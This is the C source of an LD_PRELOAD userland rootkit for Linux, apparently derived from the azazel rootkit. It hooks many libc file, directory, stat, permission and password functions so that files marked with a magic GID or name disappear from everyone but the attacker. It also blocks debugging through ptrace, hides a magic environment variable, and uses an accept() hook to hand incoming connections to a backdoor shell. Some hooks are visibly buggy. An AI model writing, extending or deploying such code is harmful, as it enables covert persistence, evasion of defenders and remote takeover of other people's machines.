#define _GNU_SOURCE
#define _LARGEFILE_SOURCE 1
#include <stdio.h>
#include <unistd.h>
#include <strings.h>
#include <string.h> 
#include <dlfcn.h> 
#include <fcntl.h>
#include <errno.h> 
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <errno.h> 
#include <netinet/in.h> 
#include <dirent.h>
#include <limits.h> 
#include <pwd.h> 
#include <shadow.h> 
#include "utils/clean.h"
#include "utils/xor.c"
#include "utils/drop_shell.h"
#include "rkconst.h"
//function pointers to hooked functions

// too lazy to group these hooks
int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
char *(*old_fgets)(char *s, int size, FILE *stream);
long int (*old_ptrace)(enum __ptrace_request request, ...);
off_t (*old_lseek)(int fildes, off_t offset, int whence);
int (*old_accept)(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);
char *(*old_getenv)(const char *name);

//directory functions
struct dirent *(*old_readdir)(DIR *dirp);
struct dirent64 *(*old_readdir64)(DIR *dirp);
int (*old_chdir)(const char *path);
int (*old_fchdir)(int fildes); 
int (*old_mkdir)(const char *pathname, mode_t mode); 
int (*old_mkdirat)(int dirfd, const char *pathname, mode_t mode);
int (*old_rmdir)(const char *pathname); 
DIR *(*old_opendir)(const char *name);
DIR *(*old_opendir64)(const char *name);
DIR *(*old_fdopendir)(int fd);

//file linking functions 
int (*old_link)(const char *oldpath, const char *newpath); 
int (*old_unlink)(const char *path);
int (*old_unlinkat)(int dirfd, const char *pathname, int flags); 
int (*old_symlink)(const char *path1, const char *path2); 

//file opening functions 
int (*old_access)(const char *path, int amode); 
int (*old_open)(const char *file, int oflag, ...);
int (*old_open64)(const char *file, int oflag, ...);
int (*old_openat)(int fd, const char *path, int oflag, ...);
int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
FILE *(*old_fopen)(const char *pathname, const char *mode); 

//read 
size_t (*old_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream); 

//write
int (*old_creat)(const char *path, mode_t mode);
int (*old_fputs)(const char *s, FILE *stream);
size_t (*old_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream);

//file naming functions 
int (*old_rename)(const char *oldpath, const char *newpath);
int (*old_renameat)(int olddirfd, const char *oldpath, int newdirfd, const char *newpath);

//stat functions
int (*old_stat)(const char *path, struct stat *buf);
int (*old_stat64)(const char *path, struct stat64 *buf);
int (*old___xstat)(int ver, const char *path, struct stat *buf); 
int (*old___lxstat)(int ver, const char *path, struct stat *buf); 
int (*old___fxstat)(int ver, int fildes, struct stat *buf);
int (*old_fstat)(int fildes, struct stat *buf); 
int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf, int flag); 
int (*old_lstat)(const char *restrict path, struct stat *restrict buf);
int (*old___xstat64)(int ver, const char *path, struct stat64 *buf); 
int (*old___lxstat64)(int ver, const char *path, struct stat64 *buf); 
int (*old___fxstat64)(int ver, int fildes, struct stat64 *buf);

//permissions and ownership  
int (*old_chmod)(const char *pathname, mode_t mode);
int (*old_fchmod)(int fd, mode_t mode);
int (*old_fchmodat)(int dirfd, const char *pathname, mode_t mode, int flags);
int (*old_chown)(const char *pathname, uid_t owner, gid_t group); 
int (*old_fchown)(int fd, uid_t owner, gid_t group); 
int (*old_lchown)(const char *pathname, uid_t owner, gid_t group); 
gid_t (*old_getgid)(void);

//passwords 
struct passwd *(*old_getpwent)(void);
struct passwd *(*old_getpwnam)(const char *name); 
struct passwd *(*old_getpwuid)(uid_t uid); 
int (*old_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result); 
struct spwd *(*old_getspnam)(char *name); 

int owned(void)
{ 
	int x;
	
	if ((getuid() == 0) || getgid() == MAGICGID)
	{
		setuid(0); 
		x = 1; 
	} 
	else 
		x = 0; 
	return x; 
} 

void __attribute ((constructor)) init(void)
{ 
	#ifdef DEBUG
	printf("==========LOADED==========\n");
	#endif 
} 

char *getenv(const char *name)
{ 
	HOOK(getenv); 
	#ifdef DEBUG 
	printf("[!] getenv hooked\n"); 
	#endif 

	if (owned()) return old_getenv(name); 
	char *magicenv = strdup(MAGICENV); xor(magicenv); 
	if (!strcmp(MAGICENV, name))
	{ 
		return NULL; // lol hidden
	}
	return old_getenv(name);
}


long int ptrace(enum __ptrace_request request, ...)
{
	HOOK(ptrace);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] ptrace hooked\n"); 
	#endif 	
	char *msg = strdup(PTRACE_MSG); xor(msg); 
	printf("%s\n", msg); 
	exit(-1);
}

int execve(const char *path, char *const argv[], char *const envp[])
{
	HOOK(execve);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] execve hooked"); 
	#endif
	if (owned()) return old_execve(path, argv, envp); 
	return old_execve(path, argv, envp); 
}		       	

off_t lseek(int fildes, off_t offset, int whence)
{ 
	HOOK(lseek);
	HOOK(__fxstat); 
	#ifdef DEBUG 
	printf("[!] lseek hooked\n");
	#endif

	if (owned()) return old_lseek(fildes, offset, whence); 
	struct stat filestat; 
	old___fxstat(_STAT_VER, fildes, &filestat); 
	if (filestat.st_gid == MAGICGID)
	{ 
		errno = EBADF; 
		return -1;
	}
	return old_lseek(fildes, offset, whence);
}

int accept(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len)
{ 
	HOOK(accept); 
	#ifdef DEBUG 
	printf("[!] accept hooked\n"); 
	#endif 

	if (owned()) return old_accept(socket, address, address_len); 
	int sock = old_accept(socket, address, address_len); 
	return drop_shell(sock, address);
}

int stat(const char *path, struct stat *buf)
{
	HOOK(stat);
	#ifdef DEBUG
	printf("[!] stat hooked\n"); 
	#endif

	if (owned()) return old_stat(path, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old_stat(path, &filestat);
	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_stat(path, buf);	
}

int stat64(const char *path, struct stat64 *buf)
{ 
	HOOK(stat64);
	#ifdef DEBUG
	printf("[!] stat64 hooked"); 
	#endif	
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat64 filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old_stat64(path, &filestat); 
	if (owned()) return old_stat64(path, buf); 
	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
	{
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_stat64(path, buf); 
}

int __xstat(int ver, const char *path, struct stat *buf)
{ 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] __xstat hooked\n"); 
	#endif	
	
	struct stat filestat;
       	old___xstat(ver, path, &filestat);	
	#ifdef DEBUG
	printf("file: %s\n", path); 
	printf("gid: %d\n", filestat.st_gid);
	#endif
	if (owned()) return old___xstat(ver, path, buf);
	char *magic = strdup(MAGIC); xor(magic);
	if (strstr(path, magic) || filestat.st_gid == MAGICGID )
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old___xstat(ver, path, buf); 
} 

int __lxstat(int ver, const char *path, struct stat *buf)
{ 
	HOOK(__lxstat); 
	#ifdef DEBUG 
	printf("[!] lxstat hooked\n"); 
	#endif 

	if (owned())
	{
		return old___lxstat(ver, path, buf); 
	}
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old___lxstat(ver, path, &filestat); 
	if (strstr(path, magic) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old___lxstat(ver, path, buf); 
}
	
int __fxstat(int ver, int fildes, struct stat *buf)
{ 
	HOOK(__fxstat); 
	#ifdef DEBUG
	printf("[!] fxstat hooked\n"); 
	#endif 

	if (owned())
	{ 
		return old___fxstat(ver, fildes, buf); 
	}
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old___fxstat(ver, fildes, &filestat); 
	if (filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old___fxstat(ver, fildes, buf);
}

int lstat(const char *pathname, struct stat *buf)
{ 
	HOOK(lstat); 
	#ifdef DEBUG 
	printf("[!] lstat hooked"); 
	#endif
	struct stat filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	if (owned()) return old_lstat(pathname, buf); 
	char *magic = strdup(MAGIC); xor(magic);
	old_lstat(pathname, &filestat); 
	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_lstat(pathname, buf); 
}

int fstat(int fildes, struct stat *buf) 
{ 
	HOOK(fstat); 
	#ifdef DEBUG 
	printf("[!] fstat hooked\n"); 
	#endif
	struct stat filestat;
        memset(&filestat, 0x00, sizeof(filestat));	
	if (owned()) return old_fstat(fildes, buf); 
	old_fstat(fildes, &filestat);	
	if (filestat.st_gid == MAGICGID)
	{
		errno = ENOENT; 
		return -1; 
	}
	return old_fstat(fildes, buf);
}

int fstatat(int fd, const char *restrict path, struct stat *restrict buf, int flag)
{
	HOOK(fstatat); 
	#ifdef DEBUG
	printf("[!] fstatat hooked\n"); 
	#endif 
	struct stat filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	if (owned()) return old_fstatat(fd, path, buf, flag); 
	old_fstatat(fd, path, &filestat, flag); 
	if (filestat.st_gid == MAGICGID)
	{ 
		errno = ENOENT; 
		return -1; 
	} 
	return old_fstatat(fd, path, buf, flag);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{ 
	HOOK(__xstat64); 
	#ifdef DEBUG 
	printf("[!] xstat64 hooked\n"); 
	#endif 

	if (owned()) return old___xstat64(ver, path, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old___xstat64(_STAT_VER, path, &filestat); 
	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old___xstat64(ver, path, buf);
}

int __lxstat64(int ver, const char *path, struct stat64 *buf)
{ 
	HOOK(__lxstat64); 
	#ifdef DEBUG 
	printf("[!] lxstat64 hooked\n"); 
	#endif 

	if (owned()) return old___lxstat64(ver, path, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old___lxstat64(_STAT_VER, path, &filestat); 
	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old___lxstat64(ver, path, buf);
}

int __fxstat64(int ver, int fildes, struct stat64 *buf)
{ 
	HOOK(__fxstat64); 
	#ifdef DEBUG 
	printf("[!] fxstat64 hooked\n"); 
	#endif 

	if (owned()) return old___fxstat64(ver, fildes, buf); 
	struct stat64 filestat; 
	old___fxstat64(_STAT_VER, fildes, &filestat); 
	if (filestat.st_gid == MAGICGID)
	{ 
		errno = ENOENT; 
		return -1; 
	}
	return old___fxstat64(ver, fildes, buf);
}

int link(const char *oldpath, const char *newpath)
{ 
	HOOK(link); 
	HOOK(__xstat);
	#ifdef DEBUG
       	printf("[!] link hooked\n"); 
	#endif	
	
	struct stat filestat;
	old___xstat(_STAT_VER, oldpath, &filestat);
	if (owned()) return old_link(oldpath, newpath); 
	char *magic = strdup(MAGIC); xor(magic);
	if ((strstr(oldpath, magic)) || (strstr(newpath, magic)) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_link(oldpath, newpath); 
}	
int unlink(const char *path)
{
	HOOK(unlink);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] unlink hooked");
	#endif
	
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat);
       	if (owned()) return old_unlink(path); 
	char *magic = strdup(MAGIC); xor(magic); 
	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_unlink(path); 
}

int unlinkat(int dirfd, const char *path, int flags)
{
	HOOK(unlinkat); 
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] unlinkat hooked\n"); 
	#endif 
	
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat); 
	if (owned()) return old_unlinkat(dirfd, path, flags); 
	char *magic = strdup(MAGIC); xor(magic);
	if ((strstr(path, magic) || (filestat.st_gid == MAGICGID)))
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_unlinkat(dirfd, path, flags); 
}

int symlink(const char *path1, const char *path2)
{ 
	HOOK(symlink);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] symlink hooked");
	#endif
	
	struct stat filestat1, filestat2; 
	HOOK(__xstat);
	old___xstat(_STAT_VER, path1, &filestat1); 
	old___xstat(_STAT_VER, path2, &filestat2); 
	if (owned()) return old_symlink(path1, path2);
	char *magic = strdup(MAGIC); xor(magic);
	if (strstr(path1, MAGIC) || strstr(path2, MAGIC) || (filestat1.st_gid == MAGICGID) || (filestat2.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
	 	return -1;
	}
	CLEAN(magic);	
	return old_symlink(path1, path2); 
}

int creat(const char *path, mode_t mode)
{ 
	HOOK(creat);
	#ifdef DEBUG 
	printf("[!] creat hooked"); 
	#endif 

	if (owned()) return old_creat(path, mode); 
	char *magic = strdup(MAGIC); xor(magic); 
	if (strstr(path, magic))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_creat(path, mode); 
} 

int fputs(const char *s, FILE *stream)
{ 
	HOOK(fputs); 
	#ifdef DEBUG 
	printf("[!] fputs hooked\n"); 
	#endif 

	if (owned()) return old_fputs(s, stream); 
	char *magic = strdup(MAGIC); xor(magic); 
	if (strstr(s, magic))
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_fputs(s, stream); 
} 

size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
{ 
	HOOK(fwrite); 
	#ifdef DEBUG 
	printf("[!] fwrite hooked\n"); 
	#endif 

	if (owned()) return old_fwrite(ptr, size, nmemb, stream); 
	char *magic = strdup(MAGIC); xor(magic); 
	if (strstr(ptr, magic))
	{ 
		CLEAN(magic); 
		return 0; 
	} 
	CLEAN(magic); 
	return old_fwrite(ptr, size, nmemb, stream);
}

size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
{ 
	HOOK(fread); 
	#ifdef DEBUG 
	printf("[!] fread hooked\n"); 
	#endif 

	if (owned()) return old_fread(ptr, size, nmemb, stream); 
	char *magic = strdup(MAGIC); xor(magic); 
	if (strstr(ptr, magic))
	{ 
		CLEAN(magic); 
		return 0; 
	}
	CLEAN(magic); 
	return old_fread(ptr, size, nmemb, stream); 
}

int rename(const char *oldpath, const char *newpath)
{
	HOOK(rename);
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] rename hooked\n");
	#endif
	
	if (owned()) return old_rename(oldpath, newpath); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, oldpath, &filestat);
	if (strstr(oldpath, magic) || strstr(newpath, magic) || filestat.st_gid == MAGICGID)
	{ 
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_rename(oldpath, newpath); 
}

int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath)
{ 
	HOOK(renameat); 
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] renameat hooked\n"); 
	#endif
	
	if (owned()) return old_renameat(olddirfd, oldpath, newdirfd, newpath); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, oldpath, &filestat); 
	if (strstr(oldpath,  magic) || strstr(newpath, magic) || filestat.st_gid == MAGICGID)
	{ 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_renameat(olddirfd, oldpath, newdirfd, newpath); 
}


/*
   _                       
  (_)_ _    ___ ____ ___ __
 / /  ' \  / _ `/ _ `/ // /
/_/_/_/_/  \_, /\_,_/\_, / 
          /___/     /___/
*/ 

// this hook is from azazel, creds to all original authors
struct dirent *readdir(DIR *dirp)
{ 
	HOOK(readdir);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] readdir hooked\n"); 
	#endif
	
	char *magic = strdup(MAGIC); xor(magic); 
	char path[PATH_MAX + 1];
	struct dirent *dir; 
	struct stat filestat; 	
	if (owned()) return old_readdir(dirp); 
	do
	{ 
		dir = old_readdir(dirp); 
		if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0))
			continue; 
		if (dir != NULL)
		{ 
			int fd; 
			char fdpath[256], *dirname = (char *) malloc(sizeof(fdpath)); 
			memset(dirname, 0x0, sizeof(fdpath)); 
			fd = dirfd(dirp); 
			snprintf(fdpath, sizeof(fdpath) - 1, "/proc/self/fd/%d", fd); 
			readlink(fdpath, dirname, sizeof(fdpath) - 1); 
			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
			old___xstat(_STAT_VER, path, &filestat); 
		}
	}while (dir && (filestat.st_gid == MAGICGID)); 
	CLEAN(magic); 	
	return dir;	
} 

struct dirent64 *readdir64(DIR *dirp)
{ 
	HOOK(readdir64); 
	HOOK(__xstat64); 
	#ifdef DEBUG 
	printf("[!] readdir64 hooked\n"); 
	#endif 

	char path[PATH_MAX + 1]; 
	struct dirent64 *dir; 
	struct stat64 filestat; 
	if (owned()) return old_readdir64(dirp); 
	do 
	{ 
		dir = old_readdir64(dirp); 
		if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, ".\0") == 0))
			continue; 
		if (dir != NULL)
		{ 
			int fd; 
			char fdpath[256], *dirname = (char *) malloc(sizeof(fdpath)); 
			memset(dirname, 0x0, sizeof(fdpath)); 
			fd = dirfd(dirp); 
			snprintf(fdpath, sizeof(fdpath) - 1, "/proc/self/fd/%d", fd); 
			readlink(fdpath, dirname, sizeof(fdpath) - 1); 
			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
			old___xstat64(_STAT_VER, path, &filestat); 
		} 
	}while (dir && filestat.st_gid == MAGICGID); 
	return dir; 
}

int chdir(const char *path)
{ 
	HOOK(chdir);
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] chdir hooked\n"); 
	#endif

       	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat);	
	if (owned()) return old_chdir(path);
	char *magic = strdup(MAGIC); xor(magic);
	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_chdir(path);
} 

int fchdir(int fildes)
{ 
	HOOK(fchdir); 
	HOOK(fstat); 
	#ifdef DEBUG 
	printf("[!] fchdir hooked\n"); 
	#endif

	if (owned()) return old_fchdir(fildes); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old_fstat(fildes, &filestat); 
	if (filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = EBADF; 
		return -1; 
	}
	CLEAN(magic); 
	return old_fchdir(fildes);
}

int mkdir(const char *pathname, mode_t mode)
{ 
	HOOK(mkdir);
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] mkdir hooked\n"); 
	#endif 
	
	if (owned()) return old_mkdir(pathname, mode);
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	return old_mkdir(pathname, mode);
} 

int mkdirat(int dirfd, const char *pathname, mode_t mode)
{ 
	HOOK(mkdirat); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] mkdirat hooked"); 
	#endif

	if (owned()) return old_mkdirat(dirfd, pathname, mode);
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT;
		return -1; 
	}
	CLEAN(magic);
	return old_mkdirat(dirfd, pathname, mode); 
}
	
int rmdir(const char *pathname)
{ 
	HOOK(rmdir); 
	HOOK(__xstat); 
	#ifdef DEBUG 
	printf("[!] rmdir hooked");
	#endif 

	struct stat filestat;
	old___xstat(_STAT_VER, pathname, &filestat);	
	if (owned()) return old_rmdir(pathname); 
	char *magic = strdup(MAGIC); xor(magic);
	if ((filestat.st_gid == MAGICGID) || strstr(pathname, magic))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1;
	}
	CLEAN(magic);
	return old_rmdir(pathname); 
}

DIR *fdopendir(int fd)
{ 
	HOOK(fdopendir);
	HOOK(__fxstat);
	#ifdef DEBUG 
	printf("[!] fdopendir hooked\n"); 
	#endif 

	if (owned()) return old_fdopendir(fd); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___fxstat(_STAT_VER, fd, &filestat); 
	if (filestat.st_gid == MAGICGID)
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return NULL; 
	}
	CLEAN(magic); 
	return old_fdopendir(fd);
}

DIR *opendir(const char *name)
{ 
	HOOK(opendir); 
	HOOK(__xstat);
	#ifdef DEBUG 
      	printf("[!] opendir hooked\n"); 
	#endif
	
	struct stat filestat; 
	old___xstat(_STAT_VER, name, &filestat);
	if (owned()) return old_opendir(name); 
	char *magic = strdup(MAGIC); xor(magic);
	if ((strstr(name, magic)) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT; 
		return NULL; 
	}
	CLEAN(magic);
	return old_opendir(name); 
} 

DIR *opendir64(const char *name)
{ 
	HOOK(opendir64); 
	HOOK(__xstat64); 
	#ifdef DEBUG 
	printf("[!] opendir64 hooked\n");
	#endif 

	struct stat64 filestat; 
	old___xstat64(_STAT_VER, name, &filestat); 
	if (owned()) return old_opendir64(name); 
	char *magic = strdup(MAGIC); xor(magic); 
	if ((strstr(name, magic)) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return NULL; 
	} 
	CLEAN(magic); 
	return old_opendir64(name); 
} 

int open(const char *file, int oflag, ...)
{ 
	HOOK(open); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] open hooked\n"); 
	#endif 
	
	if (owned()) return old_open(file, oflag); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, file, &filestat); 
	if ((strstr(file, magic)) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_open(file, oflag);
}

int open64(const char *file, int oflag, ...)
{ 
	HOOK(open64); 
	HOOK(__xstat64); 
	#ifdef DEBUG 
	printf("[!] open64 hooked\n"); 
	#endif 

	if (owned()) return old_open64(file, oflag); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat; 
	old___xstat64(_STAT_VER, file, &filestat); 
	if ((strstr(file, magic)) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_open(file, oflag); 
}

int openat(int fd, const char *path, int oflag, ...)
{ 
	HOOK(openat); 
	HOOK(__xstat); 
	#ifdef DEBUG 
	printf("[!] openat hooked\n"); 
	#endif 

	if (owned()) return old_openat(fd, path, oflag); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat); 
	if ((strstr(path, magic)) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_openat(fd, path, oflag);
}

int access(const char *pathname, int mode)
{ 
	HOOK(access); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] access hooked\n"); 
	#endif

	if (owned()) return old_access(pathname, mode); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_access(pathname, mode);
}
FILE *fopen(const char *pathname, const char *mode)
{ 
	HOOK(fopen);
       	HOOK(__xstat);	
	#ifdef DEBUG 
	printf("[!] fopen hooked\n"); 
	#endif 

	if (owned()) return old_fopen(pathname, mode);
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT;
		return NULL;
	}
	CLEAN(magic);
	return old_fopen(pathname, mode);
}	

char *fgets(char *s, int size, FILE *stream)
{ 

	struct stat filestat;
	HOOK(fgets); 
	HOOK(__xstat);
        HOOK(access);	
	#ifdef DEBUG 
	printf("[!] fgets hooked\n"); 
	#endif
	char *p = old_fgets(s, size, stream);
	if (p == NULL)
		return(p);
	if (owned())
		return old_fgets(s, size, stream);
	if (old_access(s, F_OK) != -1) 
	{ 
		old___xstat(_STAT_VER, s, &filestat); 
		char *magic = strdup(MAGIC); xor(magic);
		if (filestat.st_gid == MAGICGID)
		{ 
			CLEAN(magic); 
			return NULL; 
		}
		else
		{
			CLEAN(magic); 
			return p; // continue
		}	
	}
	return p;
}		

int chmod(const char *path, mode_t mode) 
{ 
	HOOK(chmod);
	#ifdef DEBUG 
	printf("[!] chmod hooked");
	#endif
	
	struct stat filestat; 
	HOOK(__xstat);	
	old___xstat(_STAT_VER, path, &filestat);	
        if (owned()) return old_chmod(path, mode); 	
	char *magic = strdup(MAGIC); xor(magic);
	if ((strstr(path, magic)) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1;
	}
	CLEAN(magic);
	return old_chmod(path, mode);
}

int fchmod(int fd, mode_t mode)
{ 
	HOOK(fchmod);
	#ifdef DEBUG 
	printf("[!] fchmod hooked\n"); 
	#endif 

	struct stat filestat;
	HOOK(__fxstat); 
	old___fxstat(_STAT_VER, fd, &filestat); 
	if (owned()) return old_fchmod(fd, mode); 
	char *magic = strdup(MAGIC); xor(magic); 
	if (filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic);  
	return old_fchmod(fd, mode); 
}	

int chown(const char *pathname, uid_t owner, gid_t group)
{ 
	HOOK(chown); 
	#ifdef DEBUG 
	printf("[!] chown hooked\n"); 
	#endif 

	if (owned()) return old_chown(pathname, owner, group); 
	char *magic = strdup(MAGIC); xor(magic); 
	if (strstr(pathname, magic))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_chown(pathname, owner, group);
}	

int fchown(int fd, uid_t owner, gid_t group)
{ 
	HOOK(fchown); 
	HOOK(fstat); 
	#ifdef DEBUG 
	printf("[!] fchown hooked\n"); 
	#endif 

	if (owned()) return old_fchown(fd, owner, group); 
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old_fstat(fd, &filestat); 
	if (filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_fchown(fd, owner, group); 
}

int lchown(const char *pathname, uid_t owner, gid_t group)
{ 
	HOOK(lchown); 
	HOOK(__xstat); 
	#ifdef DEBUG 
	printf("[!] lchown hooked\n"); 
	#endif 

	if (owned()) return old_lchown(pathname, owner, group); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
	{ 
		 CLEAN(magic);
		 errno = ENOENT; 
		 return -1; 
	} 
	CLEAN(magic);
	return old_lchown(pathname, owner, group); 
}

struct passwd *getpwent(void)
{ 
	HOOK(getpwent); 
	#ifdef DEBUG 
	printf("[!] getpwent hooked\n"); 
	#endif

	struct passwd *pw = old_getpwent(); 
	if (owned()) return old_getpwent(); 
	char *user = strdup(MAGIC); xor(user); 
	if (!strcmp(pw->pw_name, user))
	{ 
		CLEAN(user); 
		errno = ESRCH; //not here!!!
		return -1; 
	} 
	return pw; 
}

